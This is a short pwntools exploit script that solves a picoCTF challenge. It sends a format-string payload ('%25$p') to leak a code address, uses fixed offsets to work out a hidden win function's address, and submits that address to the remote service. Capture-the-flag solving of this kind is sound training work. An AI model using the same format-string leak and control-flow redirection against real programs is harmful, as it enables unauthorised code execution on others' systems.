#!/usr/bin/python3
from pwn import *

#context.binary = exe = ELF('./v2', checksec=False)
#p=process(exe.path)
p=remote('rescued-float.picoctf.net', 55048)


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
            start          
            ''')
#GDB()

win_offset=0x136e
main_offset=0x1400

p.recvuntil(b"Enter your name:")
payload = b"%25$p" 
p.sendline(payload)
main_leak = p.recvline()[:-1]
print(main_leak.decode()) 

main_leak = int(main_leak, 16)
log.info(f"Main leak address: {hex(main_leak)}")

win_addr = main_leak - (main_offset - win_offset)
payload = hex(win_addr) 
sla(b'0x12345: ', payload)
p.interactive()
